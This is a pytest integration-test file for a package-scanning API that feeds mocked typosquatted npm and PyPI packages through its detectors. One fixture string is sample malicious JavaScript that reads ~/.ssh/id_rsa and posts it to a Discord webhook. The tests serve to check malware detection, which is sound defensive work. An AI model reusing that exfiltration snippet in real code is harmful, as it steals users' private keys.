"""Registry-mocked end-to-end API scans; archives are inspected but never run."""

import asyncio
import hashlib
import json
from datetime import datetime, timezone

import pytest
from httpx import AsyncClient

from app.acquisition.service import RegistryPackageAcquirer
from app.database import repository
from app.database.connection import get_sessionmaker
from app.detection.scanner import Finding as DetectorFinding
from app.detection.scoring import build_verdict
from tests.acquisition_fixtures import FakeRegistry, make_tgz, npm_routes


VERSION = "1.0.0"
MALICIOUS_SOURCE = (
    'const key = read(home + "/.ssh/id_rsa"); '
    'post("https://discord.com/api/webhooks/1/abc", key);'
)


def npm_registry(
    name: str,
    repository: str = "lodash/lodash",
) -> FakeRegistry:
    package_manifest = {
        "name": name,
        "version": VERSION,
        "repository": {
            "type": "git",
            "url": f"https://github.com/{repository}",
        },
    }
    archive = make_tgz(
        {
            "package/package.json": json.dumps(package_manifest),
            "package/index.js": MALICIOUS_SOURCE,
        }
    )
    return FakeRegistry(
        npm_routes(name, {VERSION: archive}, downloads=5)
    )


def pypi_registry(name: str) -> FakeRegistry:
    now = datetime.now(timezone.utc)
    upload_time = now.isoformat().replace("+00:00", "Z")
    package_info = (
        "Metadata-Version: 2.1\n"
        f"Name: {name}\n"
        f"Version: {VERSION}\n"
        "Summary: Mocked package for scan integration tests\n"
    )
    archive = make_tgz(
        {
            f"{name}-{VERSION}/PKG-INFO": package_info,
            f"{name}-{VERSION}/package/index.js": MALICIOUS_SOURCE,
        }
    )
    file_url = f"https://files.pythonhosted.org/packages/mock/{name}-{VERSION}.tar.gz"
    release_file = {
        "filename": f"{name}-{VERSION}.tar.gz",
        "url": file_url,
        "packagetype": "sdist",
        "digests": {"sha256": hashlib.sha256(archive).hexdigest()},
        "upload_time_iso_8601": upload_time,
    }
    info = {
        "name": name,
        "version": VERSION,
        "summary": "Mocked package for scan integration tests",
        "author": "Test Publisher",
        "project_urls": {"Source": "https://github.com/expressjs/express"},
        "requires_dist": [],
    }
    release = {
        "info": info,
        "urls": [release_file],
        "releases": {VERSION: [release_file]},
    }
    return FakeRegistry(
        {
            f"https://pypi.org/pypi/{name}/{VERSION}/json": release,
            f"https://pypi.org/pypi/{name}/json": release,
            file_url: archive,
        }
    )


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("ecosystem", "name", "registry_factory"),
    [
        ("npm", "expres", npm_registry),
        ("pypi", "reqeusts", pypi_registry),
    ],
)
async def test_registry_submission_to_persisted_report(
    async_client: AsyncClient,
    monkeypatch,
    ecosystem,
    name,
    registry_factory,
):
    registry = registry_factory(name)
    monkeypatch.setattr(
        "app.core.orchestrator.get_default_package_acquirer",
        RegistryPackageAcquirer,
    )

    with registry.active():
        submitted = await async_client.post(
            "/api/v1/scans",
            json={"ecosystem": ecosystem, "name": name, "version": VERSION},
        )
        assert submitted.status_code == 202
        scan_id = submitted.json()["scan_id"]

        for _ in range(50):
            status_response = await async_client.get(f"/api/v1/scans/{scan_id}")
            assert status_response.status_code == 200
            if status_response.json()["status"] in {"completed", "failed"}:
                break
            await asyncio.sleep(0.02)

        response = await async_client.get(f"/api/v1/scans/{scan_id}/report")

    assert response.status_code == 200
    report = response.json()
    assert report["job_status"] == "completed"
    assert report["analysis_complete"] is False
    assert report["compatibility_profile"]["coverage"] == 60.0
    stages = report["compatibility_profile"]["stages"]
    assert stages["static_analysis"] == "completed"
    assert stages["metadata_analysis"] == "completed"
    assert stages["typosquatting_analysis"] == "completed"
    assert stages["behavioral_analysis"] == "unavailable"
    assert stages["dependency_analysis"] == "unavailable"
    assert report["detection_flags"] == {
        "metadata": True,
        "typosquatting": True,
    }, report["findings"]
    assert any(item["category"] == "credential_access" for item in report["findings"])
    assert any(item["category"] == "network_exfiltration" for item in report["findings"])
    assert any(item["category"] == "repository_integrity" for item in report["findings"])
    assert any(item["category"] == "typosquatting" for item in report["findings"])
    assert any(item["rule_id"] == "CORR-CRED-EXFIL" for item in report["correlations"])
    findings_by_rule = {item["rule_id"]: item for item in report["findings"]}
    assert findings_by_rule["META004"]["source"] == "metadata_analysis"
    assert findings_by_rule["META004"]["confidence"] >= 0.7
    assert findings_by_rule["TYPO001"]["source"] == "typosquatting_analysis"
    assert findings_by_rule["TYPO001"]["confidence"] >= 0.8
    assert len(report["package"]["archive_hash"]) == 64
    assert "verdict" not in report

    async with get_sessionmaker()() as session:
        scan = await repository.get_scan_with_findings(session, report["scan_id"])
    assert scan is not None
    assert scan.status == "completed"
    assert scan.package_version.archive_hash == report["package"]["archive_hash"]
    assert scan.package_version.archive_hash
    assert {item.rule_id for item in scan.findings} >= {
        "META004",
        "TYPO001",
        "PACKAGESENTINEL-CREDENTIAL_ACCESS",
        "PACKAGESENTINEL-NETWORK_EXFIL",
    }

    checks_by_category = {
        "credential_access": "credential_access",
        "network_exfiltration": "network_exfil",
        "repository_integrity": "metadata",
        "typosquatting": "typosquat",
    }
    detector_findings = []
    for item in report["findings"]:
        check = checks_by_category.get(item["category"])
        if check is None or item["severity"] == "low":
            continue
        detector_findings.append(
            DetectorFinding(
                check=check,
                severity="malicious" if item["severity"] == "critical" else "suspicious",
                weight=25,
                message=item["evidence"],
            )
        )
    verdict = build_verdict(
        {"name": name, "ecosystem": ecosystem, "version": VERSION},
        detector_findings,
    )
    assert verdict["band"] != "clean"


@pytest.mark.asyncio
async def test_established_similar_name_does_not_set_typosquatting_flag(
    async_client: AsyncClient,
    monkeypatch,
):
    registry = npm_registry("expres", repository="expressjs/express")
    registry.routes[
        "https://api.npmjs.org/downloads/point/last-week/expres"
    ] = {"downloads": 1_000_000, "package": "expres"}
    monkeypatch.setattr(
        "app.core.orchestrator.get_default_package_acquirer",
        RegistryPackageAcquirer,
    )

    with registry.active():
        submitted = await async_client.post(
            "/api/v1/scans",
            json={"ecosystem": "npm", "name": "expres", "version": VERSION},
        )
        scan_id = submitted.json()["scan_id"]
        for _ in range(50):
            status_response = await async_client.get(f"/api/v1/scans/{scan_id}")
            if status_response.json()["status"] in {"completed", "failed"}:
                break
            await asyncio.sleep(0.02)
        response = await async_client.get(f"/api/v1/scans/{scan_id}/report")

    assert response.status_code == 200
    report = response.json()
    assert report["detection_flags"]["typosquatting"] is False
    assert not any(
        finding["category"] == "typosquatting"
        and finding["severity"] != "low"
        for finding in report["findings"]
    )
